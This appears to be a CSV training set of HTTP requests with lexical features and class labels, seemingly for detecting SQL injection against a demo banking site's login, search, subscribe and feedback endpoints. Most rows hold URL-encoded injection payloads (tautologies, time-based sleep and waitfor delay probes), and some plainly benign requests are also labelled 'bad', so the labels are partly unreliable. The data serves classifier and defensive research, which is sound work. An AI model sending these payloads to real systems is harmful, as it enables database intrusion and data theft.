,method,body,path,single_q,double_q,dashes,braces,spaces,badwords,class
133,POST,b'btnSubmit=%f0%27%27%f0%22%22&passw=acUn3t1x&uid=1',b'/doLogin',2,2,0,0,0,1,bad
134,GET,b'',b'/search.jsp?query=%f0%27%27%f0%22%22',2,2,0,0,0,0,bad
135,POST,b'btnSubmit=-1%22%20or%20%2211%22%3d%220&passw=acUn3t1x&uid=1',b'/doLogin',0,4,0,0,2,1,bad
136,GET,b'',b'/high_yield_investments%27%20and%20sleep%284%29%3d%27.htm',2,0,0,1,2,1,bad
137,POST,b'btnSubmit=Subscribe%27%20and%20sleep%284%29%3d%27&txtEmail=sample%40email.tst',b'/doSubscribe',2,0,0,1,2,1,bad
138,GET,b'',b'/survey_questions.jsp?step=b',0,0,0,0,0,0,bad
139,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
140,POST,b'cfile=comments.txt%27%20and%20sleep%284%29%3d%27&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,0,0,1,4,1,bad
141,GET,b'',b'/search.jsp?query=-1%27%20or%2074-72%20%3d%20%272',2,0,0,0,4,0,bad
142,GET,b'',b'/survey_questions.jsp?step=a',0,0,0,0,0,0,bad
143,POST,b'btnSubmit=Login%27%20and%20sleep%284%29%3d%27&passw=acUn3t1x&uid=1',b'/doLogin',2,0,0,1,2,2,bad
144,POST,b'cfile=comments.txt&comments=1%27%22&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
145,GET,b'',b'/high_yield_investments%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20.htm',1,0,1,2,6,1,bad
146,POST,b'btnSubmit=Subscribe&txtEmail=1%27%22',b'/doSubscribe',1,1,0,0,0,0,bad
147,POST,b'btnSubmit=Subscribe%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',1,0,1,2,6,1,bad
148,POST,b'cfile=comments.txt%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,2,8,1,bad
149,GET,b'',b'/search.jsp?query=-1%22%20or%20%2255%22%3d%2255',0,4,0,0,2,0,bad
150,GET,b'',b'/survey_questions.jsp?step=1%27%22',1,1,0,0,0,0,bad
151,POST,b'btnSubmit=Login&passw=1%27%22&uid=1',b'/doLogin',1,1,0,0,0,1,bad
152,POST,b'btnSubmit=Login%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',1,0,1,2,6,2,bad
153,POST,b'cfile=comments.txt&comments=%5c&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
154,POST,b'btnSubmit=Subscribe&txtEmail=%5c',b'/doSubscribe',0,0,0,0,0,0,bad
155,GET,b'',b'/survey_questions.jsp?step=-1%20or%2017%3d17',0,0,0,0,2,0,bad
156,POST,b'btnSubmit=Subscribe%22%20and%20sleep%284%29%3d%22&txtEmail=sample%40email.tst',b'/doSubscribe',0,2,0,1,2,1,bad
157,GET,b'',b'/high_yield_investments%22%20and%20sleep%284%29%3d%22.htm',0,2,0,1,2,1,bad
158,POST,b'cfile=comments.txt%22%20and%20sleep%284%29%3d%22&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,2,0,1,4,1,bad
159,POST,b'btnSubmit=Login&passw=%5c&uid=1',b'/doLogin',0,0,0,0,0,1,bad
160,GET,b'',b'/search.jsp?query=-1%22%20or%20%2255%22%3d%220',0,4,0,0,2,0,bad
161,POST,b'btnSubmit=Login%22%20and%20sleep%284%29%3d%22&passw=acUn3t1x&uid=1',b'/doLogin',0,2,0,1,2,2,bad
162,POST,b'cfile=comments.txt&comments=1%c0%00xa7%c0%a2&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
163,POST,b'btnSubmit=Subscribe&txtEmail=1%c0%00xa7%c0%a2',b'/doSubscribe',0,0,0,0,0,0,bad
164,GET,b'',b'/high_yield_investments%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.htm',1,0,1,2,6,1,bad
165,POST,b'btnSubmit=Subscribe%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',1,0,1,2,6,1,bad
166,GET,b'',b'/survey_questions.jsp?step=-1%20or%2017%3d0',0,0,0,0,2,0,bad
167,GET,b'',b'/search.jsp?query=-1%22%20or%2055-53%20%3d%20%222',0,2,0,0,4,0,bad
168,POST,b'btnSubmit=Login&passw=1%c0%00xa7%c0%a2&uid=1',b'/doLogin',0,0,0,0,0,1,bad
169,POST,b'btnSubmit=Login%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',1,0,1,2,6,2,bad
170,POST,b'cfile=comments.txt&comments=%40%40vvzyt&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
171,GET,b'',b'/survey_questions.jsp?step=%5c',0,0,0,0,0,0,bad
172,POST,b'btnSubmit=Subscribe&txtEmail=%40%40UM0Vt',b'/doSubscribe',0,0,0,0,0,0,bad
173,POST,b'btnSubmit=Subscribe%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',0,1,1,2,6,1,bad
174,GET,b'',b'/high_yield_investments%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.htm',0,1,1,2,6,1,bad
175,POST,b'cfile=comments.txt%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,2,8,1,bad
176,GET,b'',b'/survey_questions.jsp?step=-1%27%20or%20%2746%27%3d%2746',4,0,0,0,2,0,bad
177,GET,b'',b'/search.jsp?query=1%20and%20sleep%284%29%20',0,0,0,1,3,1,bad
178,POST,b'btnSubmit=Login&passw=%40%40WI5vh&uid=1',b'/doLogin',0,0,0,0,0,1,bad
179,POST,b'btnSubmit=Login%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',0,1,1,2,6,2,bad
180,POST,b'cfile=comments.txt&comments=JyI%3d&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
181,GET,b'',b'/survey_questions.jsp?step=1%c0%00xa7%c0%a2',0,0,0,0,0,0,bad
182,POST,b'btnSubmit=Subscribe&txtEmail=JyI%3d',b'/doSubscribe',0,0,0,0,0,0,bad
183,GET,b'',b'/high_yield_investments%27%3dsleep%284%29%3d%27.htm',2,0,0,1,0,1,bad
184,POST,b'cfile=comments.txt%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,1,1,2,8,1,bad
185,POST,b'btnSubmit=Subscribe%27%3dsleep%284%29%3d%27&txtEmail=sample%40email.tst',b'/doSubscribe',2,0,0,1,0,1,bad
186,GET,b'',b'/survey_questions.jsp?step=-1%27%20or%20%2746%27%3d%270',4,0,0,0,2,0,bad
187,POST,b'btnSubmit=Login&passw=JyI%3d&uid=1',b'/doLogin',0,0,0,0,0,1,bad
188,GET,b'',b'/search.jsp?query=1%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,0,1,2,6,1,bad
189,POST,b'btnSubmit=Login%27%3dsleep%284%29%3d%27&passw=acUn3t1x&uid=1',b'/doLogin',2,0,0,1,0,2,bad
190,POST,b'btnSubmit=Subscribe&txtEmail=%bf%27%bf%22',b'/doSubscribe',1,1,0,0,0,0,bad
191,POST,b'cfile=comments.txt&comments=%bf%27%bf%22&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
192,GET,b'',b'/survey_questions.jsp?step=%40%40RBDGS',0,0,0,0,0,0,bad
193,POST,b'btnSubmit=Subscribe%22%3dsleep%284%29%3d%22&txtEmail=sample%40email.tst',b'/doSubscribe',0,2,0,1,0,1,bad
194,GET,b'',b'/high_yield_investments%22%3dsleep%284%29%3d%22.htm',0,2,0,1,0,1,bad
195,POST,b'cfile=comments.txt%27%3dsleep%284%29%3d%27&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,0,0,1,2,1,bad
196,GET,b'',b'/survey_questions.jsp?step=-1%22%20or%20%22108%22%3d%22108',0,4,0,0,2,0,bad
197,POST,b'btnSubmit=Login&passw=%bf%27%bf%22&uid=1',b'/doLogin',1,1,0,0,0,1,bad
198,GET,b'',b'/search.jsp?query=1%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
199,POST,b'btnSubmit=Login%22%3dsleep%284%29%3d%22&passw=acUn3t1x&uid=1',b'/doLogin',0,2,0,1,0,2,bad
200,POST,b'cfile=comments.txt&comments=%f0%27%27%f0%22%22&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',2,2,0,0,2,0,bad
201,GET,b'',b'/survey_questions.jsp?step=JyI%3d',0,0,0,0,0,0,bad
202,POST,b'btnSubmit=Subscribe&txtEmail=%f0%27%27%f0%22%22',b'/doSubscribe',2,2,0,0,0,0,bad
203,POST,b'btnSubmit=Subscribe%20and%20sleep%284%29%20&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,1,3,1,bad
204,GET,b'',b'/high_yield_investments%20and%20sleep%284%29%20.htm',0,0,0,1,3,1,bad
205,POST,b'cfile=comments.txt%22%3dsleep%284%29%3d%22&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,2,0,1,2,1,bad
206,POST,b'btnSubmit=Login&passw=%f0%27%27%f0%22%22&uid=1',b'/doLogin',2,2,0,0,0,1,bad
207,GET,b'',b'/survey_questions.jsp?step=-1%22%20or%20%22108%22%3d%220',0,4,0,0,2,0,bad
208,GET,b'',b'/search.jsp?query=1%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
209,POST,b'btnSubmit=Login%20and%20sleep%284%29%20&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,1,3,2,bad
210,POST,b'cfile=comments.txt&comments=1&email_addr=3137%2520Laguna%2520Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
211,GET,b'',b'/survey_questions.jsp?step=%bf%27%bf%22',1,1,0,0,0,0,bad
212,GET,b'',b'/swagger/index.html',0,0,0,0,0,0,bad
213,POST,b'btnSubmit=Subscribe%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,1,2,6,1,bad
214,GET,b'',b'/high_yield_investments%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.htm',0,0,1,2,6,1,bad
215,POST,b'cfile=comments.txt%20and%20sleep%284%29%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,1,5,1,bad
216,GET,b'',b'/survey_questions.jsp?step=b%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
217,POST,b'btnSubmit=Login%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',0,0,1,2,6,2,bad
218,GET,b'',b'/search.jsp?query=1%22%20and%20sleep%284%29%3d%22',0,2,0,1,2,1,bad
219,POST,b'cfile=comments.txt&comments=1&email_addr=1%27%22&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,0,0,bad
220,GET,b'',b'/survey_questions.jsp?step=%f0%27%27%f0%22%22',2,2,0,0,0,0,bad
221,POST,b'btnSubmit=Subscribe%27%3bselect%20pg_sleep%284%29%3b%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',1,0,1,1,3,2,bad
222,POST,b'cfile=comments.txt%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,1,2,8,1,bad
223,GET,b'',b'/high_yield_investments%27%3bselect%20pg_sleep%284%29%3b%20--%20.htm',1,0,1,1,3,2,bad
224,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=1%27%22',b'/doLogin',1,1,0,0,0,1,bad
225,GET,b'',b'/survey_questions.jsp?step=b%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
226,POST,b'btnSubmit=Login%27%3bselect%20pg_sleep%284%29%3b%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',1,0,1,1,3,3,bad
227,POST,b'cfile=comments.txt&comments=1&email_addr=%5c&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
228,GET,b'',b'/search.jsp?query=1%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
229,GET,b'',b'/swagger/index.html',0,0,0,0,0,0,bad
230,GET,b'',b'/swagger/-1%20or%2087%3d87.html',0,0,0,0,2,0,bad
231,POST,b'btnSubmit=Subscribe%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',3,0,1,0,5,2,bad
232,POST,b'cfile=comments.txt%27%3bselect%20pg_sleep%284%29%3b%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,1,5,2,bad
233,GET,b'',b'/high_yield_investments%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20.htm',3,0,1,0,5,2,bad
234,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=%5c',b'/doLogin',0,0,0,0,0,1,bad
235,GET,b'',b'/survey_questions.jsp?step=b%22%20and%20sleep%284%29%3d%22',0,2,0,1,2,1,bad
236,POST,b'btnSubmit=Login%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',3,0,1,0,5,3,bad
237,POST,b'cfile=comments.txt&comments=1&email_addr=1%c0%00xa7%c0%a2&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
238,GET,b'',b'/search.jsp?query=1%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,1,1,2,6,1,bad
239,GET,b'',b'/swagger/1%27%22.html',1,1,0,0,0,0,bad
240,GET,b'',b'/swagger/-1%20or%2087%3d0.html',0,0,0,0,2,0,bad
241,POST,b'btnSubmit=Subscribe%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',2,1,1,0,5,2,bad
242,POST,b'cfile=comments.txt%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',3,0,1,0,7,2,bad
243,GET,b'',b'/high_yield_investments%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20.htm',2,1,1,0,5,2,bad
244,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=1%c0%00xa7%c0%a2',b'/doLogin',0,0,0,0,0,1,bad
245,GET,b'',b'/survey_questions.jsp?step=b%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
246,POST,b'btnSubmit=Login%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',2,1,1,0,5,3,bad
247,POST,b'cfile=comments.txt&comments=1&email_addr=%40%40oaAzP&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
248,GET,b'',b'/search.jsp?query=1%27%3dsleep%284%29%3d%27',2,0,0,1,0,1,bad
249,GET,b'',b'/swagger/%5c.html',0,0,0,0,0,0,bad
250,GET,b'',b'/swagger/-1%27%20or%20%2749%27%3d%2749.html',4,0,0,0,2,0,bad
251,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
252,POST,b'cfile=comments.txt%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,1,1,0,7,2,bad
253,GET,b'',b'/index.jsp?content=personal_loans.htm',0,0,0,0,0,0,bad
254,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=%40%40lWExv',b'/doLogin',0,0,0,0,0,1,bad
255,GET,b'',b'/survey_questions.jsp?step=b%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,1,1,2,6,1,bad
256,GET,b'',b'/search.jsp?query=1%22%3dsleep%284%29%3d%22',0,2,0,1,0,1,bad
257,GET,b'',b'/swagger/1%c0%00xa7%c0%a2.html',0,0,0,0,0,0,bad
258,GET,b'',b'/swagger/-1%27%20or%20%2749%27%3d%270.html',4,0,0,0,2,0,bad
259,POST,b'cfile=comments.txt&comments=1&email_addr=JyI%3d&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
260,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=JyI%3d',b'/doLogin',0,0,0,0,0,1,bad
261,GET,b'',b'/survey_questions.jsp?step=b%27%3dsleep%284%29%3d%27',2,0,0,1,0,1,bad
262,GET,b'',b'/search.jsp?query=1%3bselect%20pg_sleep%284%29%3b%20--%20',0,0,1,1,3,2,bad
263,GET,b'',b'/swagger/-1%22%20or%20%2238%22%3d%2238.html',0,4,0,0,2,0,bad
264,GET,b'',b'/swagger/%40%404gjm0.html',0,0,0,0,0,0,bad
265,POST,b'btnSubmit=Subscribe&txtEmail=-1%20or%2099%3d99',b'/doSubscribe',0,0,0,0,2,0,bad
266,POST,b'cfile=comments.txt&comments=1&email_addr=%bf%27%bf%22&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,0,0,bad
267,GET,b'',b'/index.jsp?content=-1%20or%2050%3d50',0,0,0,0,2,0,bad
268,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=%bf%27%bf%22',b'/doLogin',1,1,0,0,0,1,bad
269,GET,b'',b'/survey_questions.jsp?step=b%22%3dsleep%284%29%3d%22',0,2,0,1,0,1,bad
270,POST,b'btnSubmit=Login&passw=-1%20or%2071%3d71&uid=1',b'/doLogin',0,0,0,0,2,1,bad
271,GET,b'',b'/swagger/-1%22%20or%20%2238%22%3d%220.html',0,4,0,0,2,0,bad
272,GET,b'',b'/search.jsp?query=1%27%3bselect%20pg_sleep%284%29%3b%20--%20',1,0,1,1,3,2,bad
273,POST,b'btnSubmit=Subscribe&txtEmail=-1%20or%2099%3d0',b'/doSubscribe',0,0,0,0,2,0,bad
274,POST,b'cfile=comments.txt&comments=-1%20or%20108%3d108&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,4,0,bad
275,GET,b'',b'/swagger/JyI%3d.html',0,0,0,0,0,0,bad
276,POST,b'cfile=comments.txt&comments=1&email_addr=%f0%27%27%f0%22%22&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',2,2,0,0,0,0,bad
277,GET,b'',b'/index.jsp?content=-1%20or%2050%3d0',0,0,0,0,2,0,bad
278,GET,b'',b'/survey_questions.jsp?step=b%20and%20sleep%284%29%20',0,0,0,1,3,1,bad
279,POST,b'btnSubmit=Login&passw=-1%20or%2071%3d0&uid=1',b'/doLogin',0,0,0,0,2,1,bad
280,POST,b'cfile=comments.txt&comments=-1%20or%20108%3d0&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,4,0,bad
281,POST,b'btnSubmit=Subscribe&txtEmail=-1%27%20or%20%2720%27%3d%2720',b'/doSubscribe',4,0,0,0,2,0,bad
282,GET,b'',b'/search.jsp?query=1%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',2,0,1,0,5,2,bad
283,GET,b'',b'/swagger/index%27%20and%20sleep%284%29%3d%27.html',2,0,0,1,2,1,bad
284,GET,b'',b'/swagger/%bf%27%bf%22.html',1,1,0,0,0,0,bad
285,GET,b'',b'/index.jsp?content=-1%20or%2050-48%20%3d%202',0,0,0,0,4,0,bad
286,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=%f0%27%27%f0%22%22',b'/doLogin',2,2,0,0,0,1,bad
287,GET,b'',b'/survey_questions.jsp?step=b%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,0,1,2,6,1,bad
288,POST,b'cfile=comments.txt&comments=-1%27%20or%20%2797%27%3d%2797&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',4,0,0,0,4,0,bad
289,POST,b'btnSubmit=Login&passw=-1%27%20or%20%2719%27%3d%2719&uid=1',b'/doLogin',4,0,0,0,2,1,bad
290,POST,b'btnSubmit=Subscribe&txtEmail=-1%27%20or%20%2720%27%3d%270',b'/doSubscribe',4,0,0,0,2,0,bad
291,GET,b'',b'/swagger/%f0%27%27%f0%22%22.html',2,2,0,0,0,0,bad
292,GET,b'',b'/search.jsp?query=1%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',3,0,1,0,5,2,bad
293,GET,b'',b'/swagger/index%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20.html',1,0,1,2,6,1,bad
294,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=1%27%22&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
295,GET,b'',b'/index.jsp?content=-1%27%20or%20%2720%27%3d%2720',4,0,0,0,2,0,bad
296,GET,b'',b'/index.jsp?content=business_other.htm',0,0,0,0,0,0,bad
297,GET,b'',b'/survey_questions.jsp?step=b%27%3bselect%20pg_sleep%284%29%3b%20--%20',1,0,1,1,3,2,bad
298,POST,b'cfile=comments.txt&comments=-1%27%20or%20%2797%27%3d%270&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',4,0,0,0,4,0,bad
299,POST,b'btnSubmit=Login&passw=-1%27%20or%20%2719%27%3d%270&uid=1',b'/doLogin',4,0,0,0,2,1,bad
300,POST,b'btnSubmit=Subscribe&txtEmail=-1%22%20or%20%2289%22%3d%2289',b'/doSubscribe',0,4,0,0,2,0,bad
301,GET,b'',b'/swagger/index%22%20and%20sleep%284%29%3d%22.html',0,2,0,1,2,1,bad
302,GET,b'',b'/search.jsp?query=1%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',2,1,1,0,5,2,bad
303,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual',0,0,0,0,0,0,bad
304,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=%5c&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
305,GET,b'',b'/index.jsp?content=-1%27%20or%20%2720%27%3d%270',4,0,0,0,2,0,bad
306,GET,b'',b'/index.jsp?content=1%27%22',1,1,0,0,0,0,bad
307,POST,b'cfile=comments.txt&comments=-1%22%20or%20%2236%22%3d%2236&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,4,0,0,4,0,bad
308,GET,b'',b'/survey_questions.jsp?step=b%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',3,0,1,0,5,2,bad
309,POST,b'btnSubmit=Subscribe&txtEmail=-1%22%20or%20%2289%22%3d%220',b'/doSubscribe',0,4,0,0,2,0,bad
310,POST,b'btnSubmit=Login&passw=-1%27%20or%2019-17%20%3d%20%272&uid=1',b'/doLogin',2,0,0,0,4,1,bad
311,GET,b'',b'/swagger/index%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.html',1,0,1,2,6,1,bad
312,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual',0,0,0,0,0,0,bad
313,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=1%c0%00xa7%c0%a2&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
314,GET,b'',b'/index.jsp?content=-1%27%20or%2020-18%20%3d%20%272',2,0,0,0,4,0,bad
315,GET,b'',b'/index.jsp?content=%5c',0,0,0,0,0,0,bad
316,POST,b'cfile=comments.txt&comments=-1%22%20or%20%2236%22%3d%220&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,4,0,0,4,0,bad
317,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%20and%20sleep%284%29%3d%27',b'/doSubscribe',2,0,0,1,2,1,bad
318,GET,b'',b'/survey_questions.jsp?step=b%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',2,1,1,0,5,2,bad
319,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%20or%2058%3d58',0,0,0,0,2,0,bad
320,POST,b'btnSubmit=Login&passw=-1%22%20or%20%2222%22%3d%2222&uid=1',b'/doLogin',0,4,0,0,2,1,bad
321,GET,b'',b'/swagger/index%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.html',0,1,1,2,6,1,bad
322,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=1%27%22',1,1,0,0,0,0,bad
323,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=%40%40lGkk0&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
324,GET,b'',b'/index.jsp?content=-1%22%20or%20%2225%22%3d%2225',0,4,0,0,2,0,bad
325,GET,b'',b'/index.jsp?content=1%c0%00xa7%c0%a2',0,0,0,0,0,0,bad
326,POST,b'cfile=comments.txt&comments=1%20and%20sleep%284%29%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,1,5,1,bad
327,POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',b'/doSubscribe',1,0,1,2,6,1,bad
328,POST,b'btnSubmit=Login&passw=-1%22%20or%20%2222%22%3d%220&uid=1',b'/doLogin',0,4,0,0,2,1,bad
329,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%20or%2058%3d0',0,0,0,0,2,0,bad
330,GET,b'',b'/default.jsp?content=security.htm',0,0,0,0,0,0,bad
331,GET,b'',b'/swagger/index%27%3dsleep%284%29%3d%27.html',2,0,0,1,0,1,bad
332,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=%5c',0,0,0,0,0,0,bad
333,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=JyI%3d&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
334,GET,b'',b'/index.jsp?content=%40%40ussS4',0,0,0,0,0,0,bad
335,GET,b'',b'/index.jsp?content=-1%22%20or%20%2225%22%3d%220',0,4,0,0,2,0,bad
